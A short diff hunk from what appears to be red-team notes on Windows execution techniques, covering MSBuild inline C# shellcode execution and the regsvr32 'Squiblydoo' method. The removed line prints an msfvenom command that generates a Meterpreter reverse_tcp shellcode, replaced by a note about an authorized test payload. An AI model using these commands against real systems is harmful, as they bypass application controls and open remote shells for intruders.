@@ -5,7 +5,7 @@
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
 - XML contains inline C# with shellcode; compiles and executes in memory
-- Generate shellcode: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f csharp`
+- Use a purpose-built C# proof payload that matches the authorized test objective
 
 ## regsvr32 / Squiblydoo (T1218.010)
 ```cmd
